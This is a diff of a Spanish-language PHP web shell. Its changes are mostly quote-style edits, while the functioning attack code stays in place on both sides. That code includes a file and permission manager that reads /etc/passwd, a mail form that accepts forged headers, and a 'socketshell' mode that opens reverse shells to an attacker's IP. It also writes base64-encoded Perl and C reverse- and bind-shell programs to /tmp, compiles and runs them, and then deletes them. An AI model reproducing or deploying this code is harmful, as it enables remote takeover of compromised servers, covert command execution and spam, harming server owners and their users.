-            if (isset($chmod) and ($chmod != "") and ($chmod != substr(sprintf('%o', fileperms($ruta)), -4))){      //si estas cambiando los permisos
-                if(chmod($ruta,$chmod_dec) or shell("chmod ".escapeshellarg($chmod)." ".escapeshellarg($ruta), false))      //probamos con chmod() y chmod de unix
+            if (isset($chmod) and ($chmod != '') and ($chmod != substr(sprintf('%o', fileperms($ruta)), -4))){      //si estas cambiando los permisos
+                if(chmod($ruta,$chmod_dec) or shell("chmod ".escapeshellarg($chmod).' '.escapeshellarg($ruta), false))      //probamos con chmod() y chmod de unix
                     echo '<div class="s center">Permisos asignados</div>';
                 else{
                     echo '<div class="n center">Imposible cambiar permisos</div><br><br>';
                 }
             }
-            if (isset($chgrp) and ($chgrp != "") and ($chgrp != $grupoarchivo)){        //si estas cambiando el grupo
-                if(chgrp($ruta,$chgrp) or shell("chgrp ".escapeshellarg($chgrp)." ".escapeshellarg($ruta), false))
+            if (isset($chgrp) and ($chgrp != '') and ($chgrp != $grupoarchivo)){        //si estas cambiando el grupo
+                if(chgrp($ruta,$chgrp) or shell('chgrp '.escapeshellarg($chgrp).' '.escapeshellarg($ruta), false))
                     echo '<div class="s center">Grupo cambiado</div>';
                 else{
                     echo '<div class="n center">Imposible cambiar el grupo</div><br><br>';
                 }
             }
-            if (isset($chown) and ($chown != "") and ($chown != $usuarioarchivo)){      //si estas cambiando el usuario
-                if(chown($ruta,$chown) or shell("chgrp ".escapeshellarg($chown)." ".escapeshellarg($ruta), false))
+            if (isset($chown) and ($chown != '') and ($chown != $usuarioarchivo)){      //si estas cambiando el usuario
+                if(chown($ruta,$chown) or shell('chgrp '.escapeshellarg($chown).' '.escapeshellarg($ruta), false))
                     echo '<div class="s center">Due&ntilde;o cambiado</div>';
                 else{
                     echo '<div class="n center">Imposible cambiar el due&ntilde;o</div><br><br>';
@@ -1092,10 +1092,10 @@ psybnc.conf
             
           
             //sacamos la lista de grupos y la mostramos
-            if($grupos = explode("\n",leerarchivo("/etc/group"))){
+            if($grupos = explode("\n",leerarchivo('/etc/group'))){
                 $listagrupos = '<select style="width:100%;" name="chgrp">'."\n";
                 foreach ($grupos as $grupo){
-                    if ($nombregrupo = substr($grupo,0,strpos($grupo,":"))){
+                    if ($nombregrupo = substr($grupo,0,strpos($grupo,':'))){
                         if($nombregrupo == $grupoarchivo){
                             $listagrupos.= '<option selected="selected">'.$nombregrupo.'</option>'."\n";
                         }else{
@@ -1109,10 +1109,10 @@ psybnc.conf
             }
             
             //sacamos la lista de usuarios y la mostramos
-            if($usuarios = explode("\n",leerarchivo("/etc/passwd"))){
+            if($usuarios = explode("\n",leerarchivo('/etc/passwd'))){
                 $listausuarios = '<select name="chown" style="width:100%;">'."\n";
                 foreach ($usuarios as $usuario){
-                    if ($nombreusuario = substr($usuario,0,strpos($usuario,":"))){
+                    if ($nombreusuario = substr($usuario,0,strpos($usuario,':'))){
                         if($nombreusuario == $usuarioarchivo){
                             $listausuarios.= '<option selected="selected">'.$nombreusuario.'</option>'."\n";
                         }else{
@@ -1162,14 +1162,14 @@ psybnc.conf
             ';
         
         if(isset($rutaOrigen) and isset($rutaDestino)){
-            if ($_POST['action']=="Copiar"){
+            if ($_POST['action']=='Copiar'){
                 if(copiar_recursivo($rutaOrigen,$rutaDestino)){
                     echo '<div class="s center">'.htmlentities($rutaOrigen,ENT_QUOTES,'UTF-8').' fue copiado a '.htmlentities($rutaDestino,ENT_QUOTES,'UTF-8').'</div>';
                 }else{
                     echo '<div class="n center">No se pudo copiar '.htmlentities($rutaOrigen,ENT_QUOTES,'UTF-8').' a '.htmlentities($rutaDestino,ENT_QUOTES,'UTF-8').'</div>';
                 }
                 echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities(dirname($rutaOrigen),ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
-            }elseif($_POST['action']=="Mover"){
+            }elseif($_POST['action']=='Mover'){
                 if(rename($rutaOrigen,$rutaDestino)){
                     echo '<div class="s center">'.htmlentities($rutaOrigen,ENT_QUOTES,'UTF-8').' fue movido a '.htmlentities($rutaDestino,ENT_QUOTES,'UTF-8').'</div>';
                 }else{
@@ -1181,27 +1181,27 @@ psybnc.conf
     break;
 
     /* Enviar emails */
-    case "mail":
+    case 'mail':
         /* Mostramos el titulo */
         echo '<div style="text-align:center;">
         <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
         </div>';
         
-        if(isset($_POST["to"]) and isset($_POST["subject"]) and isset($_POST["message"])){          //Estos son los datos obligatorios para mandar un email
+        if(isset($_POST['to']) and isset($_POST['subject']) and isset($_POST['message'])){          //Estos son los datos obligatorios para mandar un email
             //Ponemos las cabeceras opcionales
-            if(isset($_POST["from"]) and ($_POST["from"]!="")){ $cabeceras.= 'From: '.$_POST["from"]."\r\n";}
-            if(isset($_POST["cc"]) and ($_POST["cc"]!="")){ $cabeceras.= 'Cc: '.$_POST["cc"]."\r\n";}
-            if(isset($_POST["bcc"]) and ($_POST["bcc"]!="")){ $cabeceras.= 'Bcc: '.$_POST["bcc"]."\r\n";}
-            if(isset($_POST["reply-to"]) and ($_POST["reply-to"]!="")){ $cabeceras.= 'Reply-To: '.$_POST["reply-to"]."\r\n";}
-            if(isset($_POST["message-id"]) and ($_POST["message-id"]!="")){ $cabeceras.= 'Message-ID: '.$_POST["message-id"]."\r\n";}
-            if(isset($_POST["html"]) and ($_POST["html"])){ $cabeceras.= 'MIME-Version: 1.0' . "\r\n".'Content-type: text/html; charset=iso-8859-1' . "\r\n";}
+            if(isset($_POST['from']) and ($_POST['from']!='')){ $cabeceras.= 'From: '.$_POST['from']."\r\n";}
+            if(isset($_POST['cc']) and ($_POST['cc']!='')){ $cabeceras.= 'Cc: '.$_POST['cc']."\r\n";}
+            if(isset($_POST['bcc']) and ($_POST['bcc']!='')){ $cabeceras.= 'Bcc: '.$_POST['bcc']."\r\n";}
+            if(isset($_POST['reply-to']) and ($_POST['reply-to']!='')){ $cabeceras.= 'Reply-To: '.$_POST['reply-to']."\r\n";}
+            if(isset($_POST['message-id']) and ($_POST['message-id']!='')){ $cabeceras.= 'Message-ID: '.$_POST['message-id']."\r\n";}
+            if(isset($_POST['html']) and ($_POST['html'])){ $cabeceras.= 'MIME-Version: 1.0' . "\r\n".'Content-type: text/html; charset=iso-8859-1' . "\r\n";}
             
-            $_POST["message"] = wordwrap($_POST["message"],70);         //maximo 70 caracteres por linea
+            $_POST['message'] = wordwrap($_POST['message'],70);         //maximo 70 caracteres por linea
             
             if ($cabeceras){
-                $salida = mail($_POST["to"],$_POST["subject"],$_POST["message"],$cabeceras);
+                $salida = mail($_POST['to'],$_POST['subject'],$_POST['message'],$cabeceras);
             }else{
-                $salida = mail($_POST["to"],$_POST["subject"],$_POST["message"]);
+                $salida = mail($_POST['to'],$_POST['subject'],$_POST['message']);
             }
             
             if ($salida){
@@ -1212,23 +1212,23 @@ psybnc.conf
         }
         
         //Mostramos el formulario
-        if(isset($_POST["html"]) and ($_POST["html"])){ $checked = " checked"; }
+        if(isset($_POST['html']) and ($_POST['html'])){ $checked = ' checked'; }
         echo '<form action="'.$rfiurl.'w=mail" method="post" style="width:100%;text-align:center;"><table>
-        <tr><td>Para:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="to" value="'.htmlentities($_POST["to"],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
-        <tr><td>De:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="from" value="'.htmlentities($_POST["from"],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
-        <tr><td>Cc:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="cc" value="'.htmlentities($_POST["cc"],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
-        <tr><td>Bcc:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="bcc" value="'.htmlentities($_POST["bcc"],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
-        <tr><td>Responder a:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="reply-to" value="'.htmlentities($_POST["reply-to"],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
-        <tr><td>ID:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="message-id" value="'.htmlentities($_POST["message-id"],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
-        <tr><td>Asunto:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="subject" value="'.htmlentities($_POST["subject"],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
+        <tr><td>Para:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="to" value="'.htmlentities($_POST['to'],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
+        <tr><td>De:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="from" value="'.htmlentities($_POST['from'],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
+        <tr><td>Cc:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="cc" value="'.htmlentities($_POST['cc'],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
+        <tr><td>Bcc:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="bcc" value="'.htmlentities($_POST['bcc'],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
+        <tr><td>Responder a:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="reply-to" value="'.htmlentities($_POST['reply-to'],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
+        <tr><td>ID:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="message-id" value="'.htmlentities($_POST['message-id'],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
+        <tr><td>Asunto:</td><td style="width:90%;"><input type="text" style="width:100%; align:left;" name="subject" value="'.htmlentities($_POST['subject'],ENT_QUOTES, 'UTF-8').'"><br></td></tr>
         <tr><td>HTML:</td><td style="width:90%;"><input type="checkbox" style="width:100%; align:left;" name="html"'.$checked.'><br></td></tr>
-        <tr><td>Mensaje:</td style="width:90%;"><td><textarea style="width:100%; height:200px; align:left;" name="message">'.$_POST["message"].'</textarea><br></td></tr>
+        <tr><td>Mensaje:</td style="width:90%;"><td><textarea style="width:100%; height:200px; align:left;" name="message">'.$_POST['message'].'</textarea><br></td></tr>
         <tr><td colspan="2" style="width:90%;"><input type="submit" style="width:17%; float:right;" value="Enviar"></td></tr>
         </table></form>';
     break;
 
     /* Creditos */
-    case "creditos":
+    case 'creditos':
         echo '<div style="text-align:center;">
         <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
         </div>
@@ -1239,12 +1239,12 @@ psybnc.conf
     break;
 
     /* Para redirigir sin referer */
-    case "redirect":
-        echo '<meta http-equiv="refresh" content="0; URL=http://'.htmlentities($_GET["url"],ENT_QUOTES,'UTF-8').'">';
+    case 'redirect':
+        echo '<meta http-equiv="refresh" content="0; URL=http://'.htmlentities($_GET['url'],ENT_QUOTES,'UTF-8').'">';
     break;
     
     /* Conexion inversa / escuchar */
-    case "socketshell":
+    case 'socketshell':
         /* Mostramos el titulo */
         echo '<div style="text-align:center;">
         <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
@@ -1255,8 +1255,8 @@ psybnc.conf
             <form action="'.$rfiurl.'w=socketshell" method="post">
                 <tr>
                     <td>
-                        Conexi&oacute;n inversa: <br>IP <input type="text" name="ip" value="'.($_POST["ip"]?$_POST["ip"]:$_SERVER["REMOTE_ADDR"]).'"><br>
-                        Puerto <input type="text" name="puertoinversa" value="'.($_POST["puertoinversa"]?$_POST["puertoinversa"]:"80").'"><br>
+                        Conexi&oacute;n inversa: <br>IP <input type="text" name="ip" value="'.($_POST['ip']?$_POST['ip']:$_SERVER['REMOTE_ADDR']).'"><br>
+                        Puerto <input type="text" name="puertoinversa" value="'.($_POST['puertoinversa']?$_POST['puertoinversa']:'80').'"><br>
                         <select name="metodoinversa">
                             <option value="php">PHP</option>
                             <option value="perl">Perl</option>
@@ -1266,7 +1266,7 @@ psybnc.conf
                     </td>
                     <td style="width:3px; padding:0px;"></td>
                     <td>
-                        Escuchar: <br>Puerto <input type="text" name="puertoescuchar" value="'.($_POST["puertoescuchar"]?$_POST["puertoescuchar"]:"8080").'"><br>
+                        Escuchar: <br>Puerto <input type="text" name="puertoescuchar" value="'.($_POST['puertoescuchar']?$_POST['puertoescuchar']:'8080').'"><br>
                         <select name="metodoescuchar">
                             <option value="perl">Perl</option>
                             <option value="c">C</option>
@@ -1278,65 +1278,65 @@ psybnc.conf
         </table>
         <br>
         ';
-        if($_POST["accion"]=="Conectar"){
-            if($_POST["metodoinversa"] == "php"){
-                if(is_resource($socket = pfsockopen($_POST["ip"],$_POST["puertoinversa"]))){
+        if($_POST['accion']=='Conectar'){
+            if($_POST['metodoinversa'] == 'php'){
+                if(is_resource($socket = pfsockopen($_POST['ip'],$_POST['puertoinversa']))){
                     $descriptorspec = array($socket,$socket,$socket);
-                    $shellproc = proc_open("/bin/sh",$descriptorspec,$pipes);
-                    fputs($socket,"WARNING:  The use of this U.S. Government system is restricted to authorized users only.  Unauthorized access, use, or modification of this computer system or of the data contained herein or in transit to/from this system constitutes a violation of Title 18, United States Code, Section 1030 and state criminal and civil laws.  These systems and equipment are subject to monitoring to ensure proper performance of applicable security features or procedures.  Such monitoring may result in the acquisition, recording and analysis of all data being communicated, transmitted, processed or stored in this system by a user.  If monitoring reveals possible evidence of criminal activity, such evidence may be provided to law enforcement personnel. \n\n      ANYONE USING THIS SYSTEM EXPRESSLY CONSENTS TO SUCH \n");
+                    $shellproc = proc_open('/bin/sh',$descriptorspec,$pipes);
+                    fputs($socket,'WARNING:  The use of this U.S. Government system is restricted to authorized users only.  Unauthorized access, use, or modification of this computer system or of the data contained herein or in transit to/from this system constitutes a violation of Title 18, United States Code, Section 1030 and state criminal and civil laws.  These systems and equipment are subject to monitoring to ensure proper performance of applicable security features or procedures.  Such monitoring may result in the acquisition, recording and analysis of all data being communicated, transmitted, processed or stored in this system by a user.  If monitoring reveals possible evidence of criminal activity, such evidence may be provided to law enforcement personnel. \n\n      ANYONE USING THIS SYSTEM EXPRESSLY CONSENTS TO SUCH'."\n");
                     proc_close($shellproc);
                     fclose($socket);
                     echo '<div class="s">Conectado</div>';
                 }else{
                     echo '<div class="n">No se pudo conectar</div>';
                 }
-            }elseif($_POST["metodoinversa"] == "perl"){
-		escribirarchivo("/tmp/bc.pl", base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvciIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3IiKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7"));
-		chmod("/tmp/bc.pl",0777);
-                $resultado = shell('perl /tmp/bc.pl '.$_POST["ip"]." ".$_POST["puertoinversa"]." 2>&1", false);
-                if (($resultado===false) or (substr($resultado,0,5)=="Error")){
+            }elseif($_POST['metodoinversa'] == 'perl'){
+		escribirarchivo('/tmp/bc.pl', base64_decode('IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvciIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3IiKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7'));
+		chmod('/tmp/bc.pl',0777);
+                $resultado = shell('perl /tmp/bc.pl '.$_POST['ip'].' '.$_POST['puertoinversa'].' 2>&1', false);
+                if (($resultado===false) or (substr($resultado,0,5)=='Error')){
                     echo '<div class="n">No se pudo conectar</div>';
                 }else{
                     echo '<div class="s">Conectado</div>'; 
                 }
-                unlink("/tmp/bc.pl");
-            }elseif($_POST["metodoinversa"] == "c"){
-		escribirarchivo("/tmp/bc.c", base64_decode("I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQoJcHJpbnRmKCJFcnJvciIsc3Rkb3V0KTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfQ0KICAgIGR1cDIoZmQsIDApOw0KICAgIGR1cDIoZmQsIDEpOw0KICAgIGR1cDIoZmQsIDIpOw0KICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgIGNsb3NlKGZkKTsNCn0="));
-		chmod("/tmp/bc.c",0777);
-                echo '<div class="n">'.shell("gcc -o /tmp/bc /tmp/bc.c 2>&1",false).'</div>';
-                unlink("/tmp/bc.c");
-		chmod("/tmp/bc",0777);
-                $resultado = shell('/tmp/bc '.$_POST["ip"]." ".$_POST["puertoinversa"], false);
-                if (($resultado === false) or (substr($resultado,0,5) == "Error") or(file_exists("/tmp/bc")==false)){
+                unlink('/tmp/bc.pl');
+            }elseif($_POST['metodoinversa'] == 'c'){
+		escribirarchivo('/tmp/bc.c', base64_decode('I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQoJcHJpbnRmKCJFcnJvciIsc3Rkb3V0KTsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgfQ0KICAgIGR1cDIoZmQsIDApOw0KICAgIGR1cDIoZmQsIDEpOw0KICAgIGR1cDIoZmQsIDIpOw0KICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgIGNsb3NlKGZkKTsNCn0='));
+		chmod('/tmp/bc.c',0777);
+                echo '<div class="n">'.shell('gcc -o /tmp/bc /tmp/bc.c 2>&1',false).'</div>';
+                unlink('/tmp/bc.c');
+		chmod('/tmp/bc',0777);
+                $resultado = shell('/tmp/bc '.$_POST['ip'].' '.$_POST['puertoinversa'], false);
+                if (($resultado === false) or (substr($resultado,0,5) == 'Error') or(file_exists('/tmp/bc')==false)){
                     echo '<div class="n">No se pudo conectar</div>';
                 }else{
                     echo '<div class="s">Conectado</div>'; 
                 }
-                unlink("/tmp/bc");
+                unlink('/tmp/bc');
             }
-        }elseif($_POST["accion"]=="Escuchar"){
-            if($_POST["metodoescuchar"] == "perl"){
-		escribirarchivo("/tmp/bp.pl", base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJFcnJvciI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiRXJyb3IiOw0KbGlzdGVuKFMsMykgfHwgZGllIGRpZSAiRXJyb3IiOw0KYWNjZXB0KENPTk4sUyk7DQpvcGVuIFNURElOLCI8JkNPTk4iOw0Kb3BlbiBTVERPVVQsIj4mQ09OTiI7DQpvcGVuIFNUREVSUiwiPiZDT05OIjsNCmV4ZWMgJFNIRUxMIHx8IGRpZSBwcmludCBDT05OICJDYW50IGV4ZWN1dGUgJFNIRUxMXG4iOw0KY2xvc2UgQ09OTjsNCmV4aXQgMDs="));
-		chmod("/tmp/bp.pl",0777);
-                $resultado = shell("perl /tmp/bp.pl ".$_POST['puertoescuchar']."  2>&1", false);
-                if (($resultado===false) or (substr($resultado,0,5)=="Error")){
+        }elseif($_POST['accion']=='Escuchar'){
+            if($_POST['metodoescuchar'] == 'perl'){
+		escribirarchivo('/tmp/bp.pl', base64_decode('IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJFcnJvciI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiRXJyb3IiOw0KbGlzdGVuKFMsMykgfHwgZGllIGRpZSAiRXJyb3IiOw0KYWNjZXB0KENPTk4sUyk7DQpvcGVuIFNURElOLCI8JkNPTk4iOw0Kb3BlbiBTVERPVVQsIj4mQ09OTiI7DQpvcGVuIFNUREVSUiwiPiZDT05OIjsNCmV4ZWMgJFNIRUxMIHx8IGRpZSBwcmludCBDT05OICJDYW50IGV4ZWN1dGUgJFNIRUxMXG4iOw0KY2xvc2UgQ09OTjsNCmV4aXQgMDs='));
+		chmod('/tmp/bp.pl',0777);
+                $resultado = shell('perl /tmp/bp.pl '.$_POST['puertoescuchar'].'  2>&1', false);
+                if (($resultado===false) or (substr($resultado,0,5)=='Error')){
                     echo '<div class="n">No se pudo conectar</div>';
                 }else{
                     echo '<div class="s">Conectado</div>'; 
                 }
-            }elseif($_POST["metodoescuchar"] == "c"){
-                escribirarchivo("/tmp/bp.c", base64_decode("I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8bmV0ZGIuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsKICAgIGludCBzb2NrZmQsIG5ld2ZkLCBpOwogICAgY2hhciBwYXNzWzMwXTsKICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByZW1vdGU7CiAgICBkYWVtb24oMSwwKTsKICAgIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULFNPQ0tfU1RSRUFNLDApOwogICAgaWYoIXNvY2tmZCl7CglwcmludGYoIkVycm9yIixzdGRvdXQpOwogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmVtb3RlLnNpbl9mYW1pbHkgPSBBRl9JTkVUOwogICAgcmVtb3RlLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzFdKSk7CiAgICByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7CiAgICBiaW5kKHNvY2tmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZyZW1vdGUsIDB4MTApOwogICAgbGlzdGVuKHNvY2tmZCwgNSk7CiAgICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7CiAgICBkdXAyKG5ld2ZkLDApOwogICAgZHVwMihuZXdmZCwxKTsKICAgIGR1cDIobmV3ZmQsMik7CiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsKICAgIGNsb3NlKG5ld2ZkKTsKfQ=="));
-                chmod("/tmp/bp.c",0777);
-                echo '<div class="n">'.shell("gcc -o /tmp/bp /tmp/bp.c 2>&1",false).'</div>';
-                unlink("/tmp/bp.c");
-		chmod("/tmp/bp",0777);
-                $resultado = shell('/tmp/bp '.$_POST["puertoescuchar"], false);
-                if (($resultado === false) or (substr($resultado,0,5) == "Error") or(file_exists("/tmp/bp")==false)){
+            }elseif($_POST['metodoescuchar'] == 'c'){
+                escribirarchivo('/tmp/bp.c', base64_decode('I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8bmV0ZGIuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqKmFyZ3YpIHsKICAgIGludCBzb2NrZmQsIG5ld2ZkLCBpOwogICAgY2hhciBwYXNzWzMwXTsKICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByZW1vdGU7CiAgICBkYWVtb24oMSwwKTsKICAgIHNvY2tmZCA9IHNvY2tldChBRl9JTkVULFNPQ0tfU1RSRUFNLDApOwogICAgaWYoIXNvY2tmZCl7CglwcmludGYoIkVycm9yIixzdGRvdXQpOwogICAgICAgIHJldHVybiAwOwogICAgfQogICAgcmVtb3RlLnNpbl9mYW1pbHkgPSBBRl9JTkVUOwogICAgcmVtb3RlLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzFdKSk7CiAgICByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7CiAgICBiaW5kKHNvY2tmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZyZW1vdGUsIDB4MTApOwogICAgbGlzdGVuKHNvY2tmZCwgNSk7CiAgICBuZXdmZD1hY2NlcHQoc29ja2ZkLDAsMCk7CiAgICBkdXAyKG5ld2ZkLDApOwogICAgZHVwMihuZXdmZCwxKTsKICAgIGR1cDIobmV3ZmQsMik7CiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsKICAgIGNsb3NlKG5ld2ZkKTsKfQ=='));
+                chmod('/tmp/bp.c',0777);
+                echo '<div class="n">'.shell('gcc -o /tmp/bp /tmp/bp.c 2>&1',false).'</div>';
+                unlink('/tmp/bp.c');
+		chmod('/tmp/bp',0777);
+                $resultado = shell('/tmp/bp '.$_POST['puertoescuchar'], false);
+                if (($resultado === false) or (substr($resultado,0,5) == 'Error') or(file_exists('/tmp/bp')==false)){
                     echo '<div class="n">No se pudo conectar</div>';
                 }else{
                     echo '<div class="s">Conectado</div>'; 
                 }
-                unlink("/tmp/bp");
+                unlink('/tmp/bp');
             }
         }
 
@@ -1408,7 +1408,7 @@ function leerconfig($cual, $desc){
     if ($temp!=0){
         $resultado[1]='<div class="s inline">'.htmlentities($temp).'</div>';
     }else{
-        if ($temp===""){$temp="0";}
+        if ($temp===""){$temp='0';}
         $resultado[1]='<div class="n inline">'.htmlentities($temp).'</div>';
     }
     unset($temp);
@@ -1420,19 +1420,19 @@ function shell($cmd, $array = true){
     if (!empty($cmd)){
         if (`echo a`){ $salida[]=(`$cmd`); $salida[]='Modo: `$cmd`';}
         
-        elseif (shellpopen("echo a")){$salida[]=shellpopen($cmd); $salida[]='Modo: popen($cmd)';}
+        elseif (shellpopen('echo a')){$salida[]=shellpopen($cmd); $salida[]='Modo: popen($cmd)';}
         
